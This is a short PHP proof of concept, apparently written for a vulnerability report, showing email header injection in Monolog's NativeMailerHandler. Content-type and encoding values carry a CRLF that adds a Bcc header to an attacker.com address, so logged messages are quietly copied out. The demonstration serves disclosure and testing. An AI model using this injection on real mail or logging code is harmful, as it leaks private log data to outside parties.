<?php

require __DIR__ . '/../vendor/autoload.php';

use Monolog\Logger;
use Monolog\Handler\NativeMailerHandler;

// Create a logger
$log = new Logger('vulnerability_demo');

// Create mail handler with default settings
$mailerHandler = new NativeMailerHandler(
    'SendTo@test.com',
    'Security Test',
    'SendFrom@test.com'
);

// Inject malicious headers
$mailerHandler->setContentType("text/plain\r\nBcc:malicious_1@attacker.com");
// or
// $mailerHandler->setEncoding("UTF-8\r\nBcc: malicious_2@attacker.com");

// Add handler and log a message
$log->pushHandler($mailerHandler);
$log->error("Test message");
